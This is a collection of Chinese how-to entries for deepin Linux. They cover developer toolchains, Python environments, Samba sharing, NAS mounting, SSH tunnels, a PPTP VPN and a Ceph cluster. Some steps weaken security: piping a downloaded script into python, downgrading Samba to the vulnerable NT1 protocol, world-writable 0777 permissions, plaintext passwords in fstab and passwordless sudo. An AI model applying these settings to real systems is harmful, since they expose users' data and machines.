MonoDevelop集成了很多Eclipse与MicrosoftVisual Studio的特性。

安装MonoDevelop的命令是sudo apt-get install monodevelop。

卸载MonoDevelop的命令是sudo apt-get remove monodevelop。

MonoDevelop的仓库地址是http://packages.deepin.com/deepin/pool/main/m/monodevelop/。

标题：安装.NET Core
安装.NET Core SDK前，需卸载以前安装的.Net Core版本。

安装.NET Core SDK第一步：sudo apt-get install curl libunwind8 gettext libicu52，用于下载工具和依赖库，deepin系统需安装libicu52。

安装.NET Core SDK第二步：curl -sSL -o dotnet.tar.gz https://go.microsoft.com/fwlink/?linkid=848826，下载SDK文件到dotnet.tar.gz，文件较大下载耗时。

安装.NET Core SDK第三步：sudo mkdir -p /opt/dotnet && sudo tar zxf dotnet.tar.gz -C /opt/dotnet，创建文件夹并解压SDK到/opt/dotnet目录。

安装.NET Core SDK第四步：sudo ln -s /opt/dotnet/dotnet /usr/local/bin，将dotnet工具链接到/usr/local/bin目录方便使用。

解决dotnet报段错误异常需下载libcurl3_7.38.0-4+deb8u11_amd64.deb，安装该deb包，卸载curl并锁定libcurl3。

初始化hello world程序：dotnet new console -o hwapp，然后cd hwapp。

运行示例程序需先执行dotnet restore恢复包，再执行dotnet run运行程序。

推荐的.NET Core开发工具包括Visual Studio Code（需安装C#扩展）、OmniSharp、JetBrains Rider。

官方debian安装教程链接：https://www.microsoft.com/net/core#linuxdebian。

标题：Lazarus
Lazarus是一个Pascal集成开发环境，可编译运行简单Pascal程序，有强窗体处理功能，界面清晰，操作简单，与Delphi高度兼容，可读性好、编写容易。

安装Lazarus的命令是sudo apt-get install lazarus。

卸载Lazarus的命令是sudo apt-get remove lazarus。

Lazarus的仓库地址是http://packages.deepin.com/deepin/pool/main/l/lazarus/。

标题：搭建PHP开发环境
XAMPP是一个把Apache网页服务器与PHP、Perl、phpMyAdmin及MariaDB集合在一起的安装包，可在电脑上建立网页服务器。

XAMPP for linux的下载地址为https://www.apachefriends.org，以xampp-linux-x64-7.3.1-0-installer.run为例，下载后在安装包所在文件夹的终端中执行sudo ./xampp-linux-x64-7.3.1-0-installer.run启动图形化安装程序。

XAMPP安装完成后会自动运行，需手动进入manage server界面启动全部选项。在Deepin系统中需通过命令行启动，启动命令为sudo ./opt/lampp/lampp start，重启为sudo ./opt/lampp/lampp restart，停止为sudo ./opt/lampp/lampp stop。

测试XAMPP是否成功，可打开浏览器输入localhost看是否显示welcome to xampp网页，输入localhost/phpmyadmin看是否打开phpmyadmin管理网页，两者均正常则成功。

使用XAMPP开发PHP程序，需在opt/lampp/htdocs文件夹下用命令sudo touch /opt/lampp/htdocs/name.php创建php文件，opt/lampp/apache2下的htdocs文件夹中的php文件无法在浏览器中打开。

在Deepin系统中推荐使用Sublime Text编辑器进行PHP编辑。

标题：deepin下python版本过低如何处理
安装Python 3.9.0需先安装相关组件，执行命令：sudo apt update，sudo apt install make build-essential libssl-dev zlib1g-dev liblzma-dev，sudo apt install libbz2-dev libreadline-dev libsqlite3-dev llvm，sudo apt install libncurses5-dev libncursesw5-dev xz-utils tk-dev。

Python安装包需从官网https://www.python.org/downloads/下载。

下载后解压缩安装包，命令为tar -xvf Python-3.9.0.tar.xz。

解压缩后进入安装目录，命令为cd Python-3.9.0。

进入安装目录后，执行configure配置构件文件，命令为./configure --enable-optimizations --with-ssl。

配置完成后进行编译，命令为make -j8。

编译后进行安装，命令为sudo make altinstall。

安装后需要清理，命令为sudo make clean和sudo apt autoremove。

安装完成后，用python3.9 -V命令检查版本是否正确。

标题：python3.10安装
deepin v20.7的apt源中只有python 3.7版本，本文提供手动编译安装python3.10.7的步骤。

安装python3.10.7第一步是浏览器访问官方下载页下载source code的压缩包。

创建安装目录的命令为mkdir -p /home/admin/apps/python3.10，假设用户名为admin。

解压python3.10.7压缩包的命令是tar xf Python-3.10.7.tar.xz，然后进入该目录。

预编译命令为./configure --prefix=/home/admin/apps/python3.10 --enable-optimizations，缺少依赖用apt安装。

编译并安装python3.10.7使用make和make install命令，多核CPU可给make加-j参数加速。

创建软链接的命令为sudo ln -s /home/admin/apps/python3.10/bin/python3.10 /usr/bin和sudo ln -s /home/admin/apps/python3.10/bin/python3.10-config /usr/bin。

验证python3.10安装时，python3 --version输出3.7，python3.10 --version输出3.10.7。

建议不要覆盖原本的python3.7，因曾在centos7上从3.6升到3.9导致部分工具无法使用。

标题：虚拟环境管理
虚拟环境是相对于系统级环境独立的环境，可减少第三方库依赖，实现多个开发环境独立。

pyvenv是Python 3.3、3.4推荐的虚拟环境管理方式，在Python 3.6已弃用，改为venv。

venv/pyvenv的优点是Python安装完成自带，不用安装第三方库；缺点是功能单一，环境管理不集中。

使用`python -m venv <venv name>`创建venv虚拟环境，如`python -m venv ./venv`在当前目录创建venv文件夹。

venv/pyvenv激活环境使用`source <path-to-venv>/bin/activate`，如`source ./venv/bin/activate`。

删除venv/pyvenv虚拟环境只需删除创建的文件夹，如`rm -rf ./venv`。

virtualenv是第三方库，优点是有更多参数定制环境，缺点是没有集中管理。

安装virtualenv使用`pip3 install virtualenv`命令。

virtualenv创建环境用`virtualenv <dest>`，如`virtualenv -p /usr/bin/python3.9 ./venv39`创建基于Python 3.9的环境。

virtualenvwrapper是virtualenv的二次封装，优点是统一环境管理，创建、切换方便，Linux下好用；缺点是对powershell支持差，很久不更新。

安装virtualenvwrapper使用`pip install virtualenvwrapper`命令。

virtualenvwrapper创建环境用`mkvirtualenv`，环境在`WORKON_HOME`里，如`mkvirtualenv myvenv`。

virtualenvwrapper激活环境用`workon myvenv`，删除用`rmvirtualenv myvenv`。

pipenv集成环境管理与包管理，缺点是卡、慢。安装用`pip install --user pipenv`，用Pipfile和Pipfile.lock管理包。

poetry集成环境与依赖管理，安装用`curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python -`。

poetry更新用`poetry self update`命令。

poetry新建项目用`poetry new poetry-demo`，已有项目用`poetry init`，用pyproject.toml管理环境与依赖。

poetry激活环境用`poetry shell`，安装库可编辑pyproject.toml后用`poetry install`，或用`poetry add package`。

poetry删除环境用`poetry remove poetry-demo`命令。

poetry常见问题：无法安装pytorch与torchvision，可下载whl文件用`pip install <whl>`安装。

标题：Racket
Racket是在Lisp和Scheme基础上增加了对象、类型、惰性求值等的计算机程序设计语言，也是程序设计环境，可设计自己的程序语言，自带丰富第三方库。

安装Racket的命令是sudo apt-get install racket。

卸载Racket的命令是sudo apt-get remove racket。

Racket的仓库地址是http://packages.deepin.com/deepin/pool/main/r/racket/。

标题：Deepin安装苹果编程语言swift 3
在Deepin安装苹果编程语言swift 3。

下载swift3.0，地址为https://swift.org/download/#releases，选择Ubuntu 16.04版本。也可用wget工具下载，命令为wget https://swift.org/builds/swift-3.0.2-release/ubuntu1604/swift-3.0.2-RELEASE/swift-3.0.2-RELEASE-ubuntu16.04.tar.gz。

安装swift3.0首先需要安装clang及相关库，命令为sudo apt-get install clang libicu-dev。

需要导入PGP密匙到密匙环，命令为wget -q -O - https://swift.org/keys/all-keys.asc |  gpg --import -。

解压下载的swift文件可用命令tar xzf swift-3.0.2-RELEASE-ubuntu16.04.tar.gz，可重命名文件夹为swift-3.0.2，可选移动到/opt目录。

配置命令path需进入cd，用vim .bashrc，在文件底部添加export PATH= /opt/swift-3.0.2/usr/bin:"${PATH}"，保存退出后，输入swift --version可查看版本。

标题：NASM
Netwide Assembler（简称NASM）是基于英特尔x86架构的汇编与反汇编工具，可编写16位、32位（IA-32）和64位（x86-64）程序，是Linux平台上受欢迎的汇编工具之一。

NASM的安装命令为sudo apt install nasm。

NASM的卸载命令为sudo apt remove --purge nasm。

NASM的用法格式为nasm [-@ response_file] [options...] [--] filename，查看版本可使用nasm -v（或--v）。

NASM的仓库地址是http://packages.deepin.com/deepin/pool/main/n/nasm/。

NASM的相关链接包括维基百科（https://zh.wikipedia.org/zh-cn/Netwide_Assembler）和官方网站（https://www.nasm.org/）。

标题：SASM
SASM是SimpleASM的缩写，是免费开源跨平台IDE，用于NASM、MASM、GAS和FASM汇编语言，有语法高亮和调试器。

安装SASM的命令是sudo apt install sasm。

卸载SASM的命令是sudo apt remove --purge sasm。

SASM的维基百科（英文）链接是https://en.wikipedia.org/wiki/SASM。

SASM项目主页链接是https://dman95.github.io/SASM/english.html。

标题：linux之cpu相关的命令及解析
lscpu命令从sysfs和/proc/cpuinfo收集cpu体系结构信息，输出包含cpu数量，线程，核数，套接字，缓存等。

lscpu常用参数中，-a或--all表示同时打印在线和离线CPU（-e选项默认值）；-b或--online只打印在线CPU（-p选项默认值）；-c或--offline只打印离线CPU。

lscpu的-e或--extended[=<列表>]打印扩展的可读格式；-p或--parse[=<列表>]打印可解析格式；-x或--hex打印十六进制掩码而非CPU列表。

mpstat命令可以显示随着时间变化的CPU数据，包含在sysstat工具集中，使用前需安装sysstat。

mpstat语法格式为mpstat [选项] [ <时间间隔> [ <次数> ] ]，常用参数-P用于指定执行监控的CPU，取值0~CPUNUM，或用ALL查看全部CPU。

mpstat参考实例：监控第一个CPU用mpstat -P 1；监控全部CPU用mpstat -P ALL；每隔1个时间单位采样5次用mpstat 1 5。

mpstat输出字段中，%user表示用户态程序，%nice是优先级调整，%sys为内核态消耗，%iowait是磁盘等待，%irq是硬件中断，%soft是软件中断。

mpstat输出中，%steal是处理hyperviosr的消耗，%guest是虚拟机消耗掉的CPU，%idle是CPU空闲。

mpstat字段说明：%iowait过高表示硬盘有I/O瓶颈；%idle高表示CPU较空闲；%idle高但系统响应慢可能是CPU等待分配内存，应加大内存；%idle持续低于10表明CPU处理能力低，需解决CPU资源问题。

标题：软件列表
此页面的存在主要是为了提供一个常见软件的索引，以方便您迁移到 deepin 后能够快速的找到您需要的软件，以及介绍一些 windows 中常用软件的替代方案。

办公软件套装
Calligra — KDE 办公软件套装，即 KOffice 的活跃分支。它提供了 OpenOffice 大多功能，又有智能手机和平板的版本。
https://www.calligra-suite.org/ || calligra
Kingsoft Office — 专有，又名 WPS.
http://www.kingsoftstore.com/ || [wps-office]
LibreOffice — OpenOffice 的超活跃分支之一。
https://www.libreoffice.org/ || [libreoffice]
OpenOffice — 开源的办公软件，集成了字处理，表格，幻灯片，图像，数据库以及更多的软件，采用 Apache 许可证。
https://www.openoffice.org/ || [openoffice]
Siag Office — 极度轻量，有字处理、表格、文本编辑器、文件管理器和预览器。
https://siag.nu/ || siag-office
SoftMaker Office — 完全，稳定，轻快，兼容微软办公格式，有字处理，表格，幻灯片。
https://www.freeoffice.com/ || freeoffice

标记语言文档
[什么是标记语言]
Sphinx — 使用 reStructuredText 生成多种格式的输出的文档生成系统（Python 项目的主要文档系统）。
https://www.sphinx-doc.org/ || Sphinx
txt2tags — 非常简单、符合 KISS 标准的轻量级、人类可读的标记语言，可从纯文本文件中生成丰富的格式内容。
https://txt2tags.org/ || txt2tags

AsciiDoc
AsciiDoc — 原始实现，用 Python 编写。
https://asciidoc.org/ || asciidoc
Asciidoctor — 用 Ruby 编写的实现，具有许多额外的功能。
https://asciidoctor.org/ || asciidoctor

Markdown
Abricotine — 为桌面构建的 Markdown 编辑器。基于 Electron 平台。
 || Abricotine
Apostrophe - 使用 GTK 制作的无干扰 Markdown 编辑器。
 ||Apostrophe
CuteMarkEd — 基于 Qt 的 Markdown 编辑器，具有实时 HTML 预览、数学表达式、代码和 Markdown 语法突出显示。自 2016 年起停产。
 || CuteMarkEd
Formiko — reStructuredText 和 Markdown 编辑器以及使用 GTK 用 Python 编写的实时预览器。
 || formiko
ghostwriter - 无干扰的 Markdown 编辑器。
 || ghostwriter
Marker - 简单而强大的 Markdown 编辑器。
 || Marker
Mark My Words - 最小的 Markdown 编辑器。
 || markmywords
Mark Text - 下一代 Markdown 编辑器。基于 Electron 平台。
 || Mark Text
Remarkable - 功能齐全的 Markdown 编辑器。
 || Remarkable
ReText — Markdown 和 reStructuredText 的简单文本编辑器。
 || ReText
Typora - 专有的极简 Markdown 编辑器。
 || Typora

TeX editors
撰写各种科学文档、文章、期刊一般会使用 TeX、LaTeX。
AUCTeX — AUCTeX 与 RefTex 一起为在 Emacs 中编写和格式化 TeX 文件提供了一个可扩展的环境。
 || auctex
gedit LaTeX 插件 - 向 gedit 添加代码完成功能，并允许编译 LaTeX 文档和管理 BibTeX 参考书目。
 || gedit-latex
GNOME LaTeX — GNOME 桌面的 LaTeX 编辑器，包括对代码完成、编译和项目管理的支持。
 || GNOME LaTeX
Gummi - 基于 TeX/LaTeX GTK 的轻量级编辑器。
 || Gummi
Kile — 用于 KDE 桌面的用户友好的 TeX/LaTeX 编辑器，具有许多功能。
 || Kile
LyX - 文档处理器，它鼓励基于文档结构 (WYSIWYM) 而不仅仅是外观 (WYSIWYG) 的写作方法。
 || lyx
TeXmacs — 所见即所得（所见即所得）编辑平台，具有科学家的特殊功能。
 || texmacsAUR
TeXstudio — TeXMaker 的分支，包括支持 bibtex 项目的代码完成、语法检查和自动检测是否需要多次运行 LaTeX。
 || TeXstudio
TeXworks — 以 TeXShop 为模型的简单 TeX 前端程序。
 || TeXworks
TikZiT — 使用 PGF/TikZ 快速创建图形和图表的图形工具。
 || TikZiT
Vim-LaTeX-suite — Vim 的可定制 LaTeX 环境。
 || vim-latexsuite

标题：LuckyBackup
LuckyBackup是一个文件备份和同步工具，图形化界面，操作简单，从单向复制到双向同步操作都可以实现。还可以通过高级选项设置包含条件、过滤条件、远程连接、命令行模式等，当备份或同步任务完成后，自动通过邮件告知用户。安装：`sudo apt-get install luckybackup`。卸载：`sudo apt-get remove luckybackup`。仓库地址：http://packages.deepin.com/deepin/pool/main/l/luckybackup/。

标题：Deepin15.4安装Filezilla FTP Server
Deepin15.4安装FTP服务器--FileZilla Server。安装方法：1. 下载 FileZilla Server 的exe安装程序：<https://filezilla-project.org/> 2. 使用 Deepin 15.4 下的 CrossOver 安装上面的软件，默认XP-32容器即可。

3. 安装完成后，在启动器中点击图标可以启动管理界面 4. 像在 Windows 下的那样，配置服务器的组，用户，以及共享文件夹。

5. 在菜单栏的 Server 下，点击 Active，观察是否可以激活，若是激活的，前面有对号。6. 如果有对号，说明服务器正常，客户端直接连接即可；否则可能会出现如下的错误：Failed to create listen socket on port 21 Failed to create a listen socket on any of the specified ports. Server is not online! 出现这个结果，说明监听21端口失败。

7. 更改默认的21端口为其他没有使用的端口，我的是改为2121。点击，菜单栏 Edit → Settings 或者界面上的齿轮图标，打开配置界面：general settings → connection settings → listen on these ports 将值由21改为2121或者其他没有使用的端口。

8. 在菜单栏的 Server 下，点击 Active，观察是否可以激活，结果正常了：Creating listen socket on port 2121... Server online 9. 接下来使用客户端连接即可。目前木有发现其他的问题。

Deepin15.4安装FTP服务器--FileZilla Server

下载 FileZilla Server 的exe安装程序：<https://filezilla-project.org/>

使用 Deepin 15.4 下的 CrossOver 安装上面的软件，默认XP-32容器即可。

安装完成后，在启动器中点击图标可以启动管理界面

像在 Windows 下的那样，配置服务器的组，用户，以及共享文件夹。

在菜单栏的 Server 下，点击 Active，观察是否可以激活，若是激活的，前面有对号。

如果有对号，说明服务器正常，客户端直接连接即可；否则可能会出现如下的错误：Failed to create listen socket on port 21 Failed to create a listen socket on any of the specified ports. Server is not online!

更改默认的21端口为其他没有使用的端口，我的是改为2121 点击，菜单栏 Edit → Settings 或者界面上的齿轮图标，打开配置界面： general settings → connection settings → listen on these ports 将值由21改为2121或者其他没有使用的端口。

在菜单栏的 Server 下，点击 Active，观察是否可以激活，结果正常了：Creating listen socket on port 2121... Server online

接下来使用客户端连接即可。目前木有发现其他的问题。

标题：FileZilla客户端
FileZilla是一个快速可靠的、跨平台的FTP、FTPS和SFTP客户端。它具有断点续传、超时侦测、SSL加密、多国语言、多标签界面、多协议支持、远程查找文件、站点管理和传输队列管理等功能。安装命令为`sudo apt-get install filezilla`，卸载命令为`sudo apt-get remove filezilla`。其仓库地址为http://packages.deepin.com/deepin/pool/main/f/filezilla/，相关链接的维基百科地址为https://zh.wikipedia.org/wiki/FileZilla。

标题：GFTP-已合并
gFTP是一个FTP客户端工具，它支持多个线程同时下载、断点续传、支持FTP、HTTP和SSH协议、支持FTP和HTTP代理，还可以下载整个目录、支持文件队列、缓存、拖拽等操作。安装命令是 `sudo apt-get install gftp`。卸载命令是 `sudo apt-get remove gftp`。仓库地址是 http://packages.deepin.com/deepin/pool/main/g/gftp/。

标题：samba常见问题
## 网络邻居中不能查看设备
初步分析为访问网络领居需要samba低版本的协议，现在默认是高版本。可以手动降低协议，但不建议；
1.降低后不能访问windows的共享，协议不匹配；
2.低版本协议有严重的安全漏洞.试下在`/etc/samba/smb.conf`配置文件中的加入一行代码，如下：
`【workgroup = WORKGROUP】`
`client max protocol = NT1`

## 挂载samba后图标显示齿轮
可能的原因：
1.gvfs包没有安全完全。特别是`gvfs-fuse`、`gvfs-backends`；
2.系统没有 fuse 驱动。通过`lsmod | grep "fuse"`，命令可以查看是否安装驱动；

## samba 无法记住密码
`/efc/profile`文件中包含删除`~/.local/share/keyrings/`的脚本，这样也是无法记住密码的；

## samba 共享中文件权限问题
1.首先查看`samba`服务器中`/etc/smb.conf`文件中的配置是否是如下:
`create mode = 0766`
`force create mode = 0766`
`directory mode = 0777`
`force directory mode = 0777`

2.用户默认创建的文件夹带有`acl`控制权限,匿名访问对应当前用户是`other`的,就没有读写权限了,通过终端创建文件夹也是带了`acl`权限的;

标题：如何创建samba共享文件夹
在深度文件管理器以及鹦鹉螺(naitulus)文件管理器中，都可以在文件夹右键菜单中找到共享文件夹的入口。但这种方式只能单用户或匿名共享。深度文件管理器与鹦鹉螺文件管理器都是通过net命令实现的文件夹共享，其核心调用为：net usershare add <share_name> <share_path> <share_comment> <share_acl> <share_allow_guest>。例如，命令net usershare add myVideo ~/Video Everyone:F "" guest_ok=y将用户目录下的Video文件夹以匿名方式共享给所有人，且都具有全部的读写权限。

在多用户分权共享时，需要创建多个用户组和用户。例如：sudo groupadd g1 && sudo groupadd g2创建了g1和g2两个用户组；sudo useradd u1 -G g1 && sudo useradd u2 -G g2创建了u1和u2两个用户，并分别加入g1组和g2组。之后，需要将用户添加到samba用户列表并设置密码，如sudo smbpasswd -a u1。

共享文件夹/home/uos/publicShare且未开启匿名时，/var/lib/samba/usershares目录下会生成publicshare文件，其中path字段为共享文件夹路径，usershare_acl字段控制权限。S-1-1-0:f表示Everyone用户具有完全访问权限，f表示完全访问权限，r表示只读权限。

通过wbinfo命令可获取用户SID，若没有该命令，可通过sudo apt install -y winbind安装。执行命令wbinfo -U `id -u`可输出用户的SID，例如获得sid-for-u1和sid-for-u2。

修改用户权限可通过两种方式：1. 直接修改共享配置文件中的usershare_acl字段，如usershare_acl=sid-for-u1:f,sid-for-u2:r；2. 通过net命令指定，如net usershare add myShare /home/uos/publicShares "no comment" u1:F,u2:R，这会在/var/lib/samba/usershares目录下生成myshare文件，其usershare_acl字段与修改文件的一致。组权限控制方法相同。

方法二是修改smb.conf文件配置共享，该文件位于/etc/samba/smb.conf，格式为ini类型，不同组以[]标识，[global]为全局配置，其余[]包裹的为共享文件夹。

例如[print$]是默认共享文件夹配置。创建自己的共享如[myShareViaCfg]，其中comment为简介，path为共享文件夹绝对路径，browseable决定是否在客户端可见，read only为只读（no为读写），guest ok是否允许匿名访问，valid user指定可访问的用户和组（@开头为组），write list指定具备写入权限的用户和组。

两种共享方式均满足：若用户适用多种权限，如u1:g1，用户配置只读、组配置读写，最终权限为读写；若acl中出现Everyone:F，其余用户权限失效，均为读写。分权限时需移除Everyone:F配置。

标题：Deepin挂载NAS
使用CIFS时，`nfs-common`，`cifs-utils`是必须的前置软件（在Ubuntu发行版下），安装命令为：`sudo apt install -y nfs-common cifs-utils`。

使用CIFS时，需编辑`/etc/fstab`文件，命令为`sudo deepin-deitor /etc/fstab`，添加内容为： your_nas_ip/dir /mnt/NAS/dir cifs rw,dir_mode=0777,file_mode=0777,vers=2.0,username=yourusername,password=yourpassword 0 0，其中`your_nas_ip`代表NAS的访问地址，`dir`代表NAS下的分享挂载点，`/mnt/mountdir`代表本设备要挂载到的路径，`yourusername`为访问的用户名，`yourpassword`为访问用户的密码，若匿名访问则不需要username与password并改为`guest`。

编辑`/etc/fstab`并保存后，执行`sudo mount -a`，若没有报错与提示信息，则成功挂载。

Deepin20下挂载整个NAS的实例：在`/mnt`下建立`NAS`文件夹，赋予权限的命令为`sudo chmod -R 777 /mnt/NAS`；在`/etc/fstab`中添加 192.168.104.44/homes /mnt/NAS/homes cifs rw,dir_mode=0777,file_mode=0777,vers=2.0,username=GBwater,password=我是密码 0 0；执行`sudo mount -a`；最后在文件管理器上右键`/mnt/NAS/homes/GBwater`，选择`添加书签`，可将其添加到侧边栏方便访问。

标题：SSH隧道
启动代理服务器的命令为：master@neko:~$ ssh -D 1080 root@99.99.99.99，该命令将会连接服务器并在本机创建端口为1080的socks5代理服务器。

终端测试中，本机IP为1.1.1.1，服务器IP为99.99.99.99。未启用代理时，执行curl ip.sb显示1.1.1.1；启用代理的命令为export all_proxy=socks5h://0:1080（仅限当前终端窗口），启用后执行curl ip.sb显示99.99.99.99。

浏览器测试需安装Proxy SwitchyOmega插件，配置代理协议为socks5，服务器地址为127.0.0.1，端口为1080；插件设置为启用状态后，访问https://ip.sb显示的IP应为99.99.99.99。

SSH动态转发代理通过ssh -D命令启动，在本地1080端口创建socks5代理服务器。终端测试需设置环境变量export all_proxy=socks5h://0:1080启用代理。浏览器测试需安装Proxy SwitchyOmega插件，配置socks5协议和127.0.0.1:1080地址。

本机初始IP为1.1.1.1，服务器IP为99.99.99.99。终端执行curl ip.sb显示原始IP，启用代理后显示服务器IP。浏览器启用插件访问https://ip.sb应显示99.99.99.99。

标题：VPN服务
VPN服务安装pptpd时，需在终端执行命令：sudo apt-get install pptpd

编辑VPN服务的pptpd主配置文件时，终端执行命令：sudo gedit /etc/pptpd.conf，且需修改为：option /etc/ppp/pptpd-options、localip 192.168.0.1、remoteip 192.168.0.11-150

编辑VPN服务的pptpd-options配置文件时，终端执行命令：sudo gedit /etc/ppp/pptpd-options，需将ms-dns项修改为8.8.8.8和8.8.4.4（也可使用ISP提供的DNS）

定义VPN登录用户名和密码的配置文件为/etc/ppp/chap-secrets，编辑该文件的终端命令为sudo gedit /etc/ppp/chap-secrets，添加内容需遵循格式："用户名" pptpd "密码" *

修改VPN服务的pptpd相关配置后，需重启pptpd进程使配置生效，终端执行命令：/etc/init.d/pptpd restart

检验PPTP服务器是否运行的终端命令为sudo netstat -anp | grep pptpd，运行成功时会得到类似结果：tcp  0  0  0.0.0.0:1723 0.0.0.0:*  LISTEN  27243/pptpd、unix  2  [ ]  数据报  200719  27243/pptpd

为使客户端顺利连接VPN服务器，需开放默认VPN端口1723，终端执行iptables命令：sudo iptables -I INPUT -p tcp --dport 1723 -j ACCEPT

开启VPN服务的ipv4转发功能，需先查看/proc/sys/net/ipv4/ip_forward文件值是否为1；若否，修改/etc/sysctl.conf文件为net.ipv4.ip_forward = 1，再执行sysctl -p和/etc/init.d/procps restart使其生效

为VPN客户端IP设置网络地址转换（NAT）的iptables命令为sudo iptables --table nat --append POSTROUTING --out-interface eth0 --jump MASQUERADE，其中“eth0”需选择对应网卡

Windows连接VPN出现网站连接异常时，需设置最大MTU，终端执行iptables命令：sudo iptables -I FORWARD -p tcp --syn -i ppp+ -j TCPMSS --set-mss 1356

通过编辑rc.local保存iptables规则（避免重启丢失），终端执行命令sudo gedit /etc/rc.local，需在文件末尾添加：iptables --table nat --append POSTROUTING --out-interface eth0 --jump MASQUERADE、iptables -I FORWARD -p tcp --syn -i ppp+ -j TCPMSS --set-mss 1356

使用iptables-save保存VPN的iptables规则，终端执行命令iptables-save > /etc/iptables-rules；后续需修改/etc/network/interfaces文件，在eth0设置末尾添加pre-up iptables-restore < /etc/iptables-rules（注：此方法未验证，有网友反映可能导致无法进入系统）

VPN服务的相关链接包括：维基百科:虚拟专用网（http://zh.wikipedia.org/wiki/%E8%99%9B%E6%93%AC%E7%A7%81%E4%BA%BA%E7%B6%B2%E8%B7%AF）、基于UBUNTU搭建VPN服务器(已验证)（http://blog.warmcolor.net/2013/06/21/%E5%9F%BA%E4%BA%8Eubuntu%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B7%B2%E9%AA%8C%E8%AF%81/）

标题：ceph群集存储系统
ceph是一个群集网络存储的系统，听上去很重量级，实际也是重量级，不过这篇文章目的是用它来做共享文件夹。

ceph群集存储系统架构包含osd、monitor、mds三个核心组件：osd是存储数据的节点，其下包含pg（归置组），pg下又包含object（存储单元对象）。

创建ceph群集虚拟机节点的第一步为：使用命令"qemu-img create -f qcow2 -o preallocation=full osd.qcow2 10g"创建磁盘，第二步通过"virt-manager"图形化工具配置虚拟机并安装debian testing cd。

ceph虚拟机节点安装完毕后，创建磁盘快照的命令为"qemu-img create -f qcow2 -o backing_file=osd.qcow2 osd1.qcow2"，目的是让各虚拟机共享基础映像以节省空间，按此方式可创建osd2.qcow2和osd3.qcow2。

克隆ceph基础虚拟机osd时，需先复制UEFI启动资料：sudo cp /var/lib/libvirt/qemu/nvram/osd_VARS.fd /var/lib/libvirt/qemu/nvram/osd1_VARS.fd，再执行克隆命令"virt-clone --connect qemu:///system -o osd -n osd1 -f osd1.qcow2 --preserve-data"，其中--preserve-data参数指定不复制磁盘内容。

配置ceph节点ssh免密码登录时，将公钥添加到节点htqx账户的命令为"ssh-copy-id -i ~/.ssh/htqxgit_rsa htqx@192.168.122.131"，还需修改节点sudo配置，让htqx账户免密码执行sudo，配置内容为"htqx ALL=(ALL) NOPASSWD:ALL"。

ceph节点设置ntp时间同步的步骤：登录节点后安装ntpdate（sudo apt install ntpdate），编辑/etc/default/ntpdate添加"ntp1.aliyun.com"，最后执行"sudo ntpdate-debian"同步时间。

添加ceph-deploy工具的步骤：先导入密钥"wget -q -O- 'https://download.ceph.com/keys/release.asc' | sudo apt-key add - "，再添加apt源"echo deb http://download.ceph.com/debian-luminous/ stretch main | sudo tee /etc/apt/sources.list.d/ceph.list"，安装后删除该源以避免冲突（sudo rm /etc/apt/sources.list.d/ceph.list）。

ceph群集网络配置：通过"virsh -c qemu:///system net-edit default"编辑网络固定ip，示例配置为<host mac='52:54:00:73:7c:67' ip='192.168.122.101'  />等；管理主机编辑/etc/hosts绑定ip与主机名，如"192.168.122.101 osd1.ceph       osd1"。

创建ceph群集的初始命令为"ceph-deploy new osd1"，会生成ceph-deploy-ceph.log日志、ceph.conf配置、ceph.mon.keyring密钥；需编辑ceph.conf添加"osd pool default size = 2"和"public_network=192.168.122.0/24"。

ceph群集安装与初始化：执行"ceph-deploy install {admin,osd1,osd2,osd3} --no-adjust-repos"安装工具（--no-adjust-repos避免修改apt源），再用"ceph-deploy mon create-initial"初始化monitor，生成多个密钥环（如ceph.client.admin.keyring、ceph.bootstrap-osd.keyring）。

ceph osd节点磁盘调整（以osd2为例）：ssh登录osd2，通过vgdisplay查看LVM磁盘组PE大小，卸载/home（sudo umoun /home），调整文件系统（sudo resize2fs /dev/osd1-vg/home 2928m），最后创建store分区（sudo lvcreate -l 523 -n store osd1-vg）。

添加ceph osd存储磁盘的命令为"ceph-deploy osd create osd2 --data /dev/osd1-vg/store"；分发管理密钥的命令是"ceph-deploy admin admin osd1 osd2 osd3"，需给密钥文件加读权限（sudo chmod +r /etc/ceph/ceph.client.admin.keyring）。

ceph群集组件管理：添加mds的命令是"ceph-deploy mds create osd1"，添加rgw（对象网关）的命令是"ceph-deploy rgw create osd1"（rgw监听7480端口）；添加monitor的命令是"ceph-deploy mon add osd2"，检查quorum状态用"ceph quorum_status --format xml-pretty"。

ceph存储池创建：命令为"ceph osd pool create mypool 8"，创建名为mypool、pg数为8的存储池；查看群集健康状态用"ceph health"，查看群集详细信息用"ceph -w"。

ceph块设备（RBD）使用：在mypool池创建1G大小的块设备foo（rbd create foo --size 1024 --pool mypool），查看块信息用"rbd info foo -p mypool"，绑定块设备到/dev/rbd0的命令为"sudo rbd map mypool/foo --name client.admin -k /etc/ceph/ceph.client.admin.keyring -m osd1.ceph"。

ceph文件系统（cephfs）使用：先创建数据池和元数据池（ceph osd pool create cephfs_data 8、ceph osd pool create cephfs_metadata 8），再创建文件系统"ceph fs new cephfs cephfs_metadata cephfs_data"；内核挂载命令为"sudo mount -t ceph osd1.ceph:6789:/ /mnt/ceph"。

ceph对象存储使用：将1.txt文件作为对象my-obj-1添加到mypool池的命令是"rados put my-obj-1 1.txt --pool mypool"，列出mypool池对象用"rados -p mypool ls"，查看my-obj-1对象位置用"ceph osd map mypool my-obj-1"。

ceph通过iscsi共享给Windows XP：服务器需安装tgt和tgt-rbd（sudo apt install tgt tgt-rbd），先绑定RBD块设备（rbd map mypool/foo），再编辑/etc/tgt/targets.conf，添加<target iqn.2019-5.localhost:iscsi>等配置，最后重启tgt服务（systemctl restart tgt）。

ceph存储方式包含三种：1. 文件系统cephfs；2. 块设备RBD；3. 对象网关rgw（含ceph-radosgw守护进程和civetweb前端，监听7480端口）。

ceph部署模式关键命令：1. ceph-deploy install（安装相关apt包）；2. ceph-deploy admin（安装管理密钥）；3. ceph-deploy --overwrite-conf config push（安装新配置文件，需先修改ceph.conf）；4. systemctl restart（重启守护进程，需开放iptables相关端口）。

ceph监视器（mon）配置：1. fsid通过uuidgen生成，配置为fsid={uuid}；2. 群集名称在ceph.conf中默认为ceph；3. 初始监视器成员配置为mon initial members = osd1，mon host=192.168.122.101。

ceph全局配置关键参数：public network =、cluster network =、auth cluster required = cephx、auth service required = cephx、auth client required = cephx、osd pool default size= 2（osd个数）。

ceph架构包含osd（存储数据的节点），其中osd包含pg（归置组），pg包含object（存储单元对象）。此外还有monitor（维护网络）和mds（ceph file system的元数据）。

